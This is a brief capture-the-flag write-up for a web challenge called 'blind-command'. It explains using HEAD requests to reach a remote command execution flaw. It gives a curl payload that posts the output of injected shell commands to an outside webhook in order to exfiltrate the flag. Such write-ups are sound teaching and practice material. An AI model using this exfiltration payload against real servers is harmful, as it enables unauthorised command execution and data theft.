# blind-command
## Summary
This challenge provide us with RCE, I chose to exfiltrate the flag by posting results of command to my webhook

## Solve
- In the code we can see that method GET is the only allowed method, but it wont run the code. Another method that is automatically allowed with GET is HEAD. We use HEAD to submit command for RCE.

>Note that HEAD is same as GET, but just get the headers, so we won't be seeing the server returning our commands.

### The payload
I decided to use curl and posting to my webhook, this is the payload for rce, use this in url: `/?cmd=<payload>`

```bash
curl -X POST "http://webhook.url" --data "$(<command>)"
```
>Note the quotes around the command block, this is used to let curl post the whole thing without treating each words separated by space char or special char, ensuring we get the whole output, note just the first word

Use that and submit using a HEAD request:
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/f32ebfe933ec373c2d3d874f1f3bc0ff642dcbb4fba364954ae32aab8a990d11.png)

We get the output in webhook:
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/cad6b94f54de4dfd417dc15c56ce055ca7700219f7c42bfcce011380bd78a437.png)

Spot the flag.py file, cat that file and get the flag.
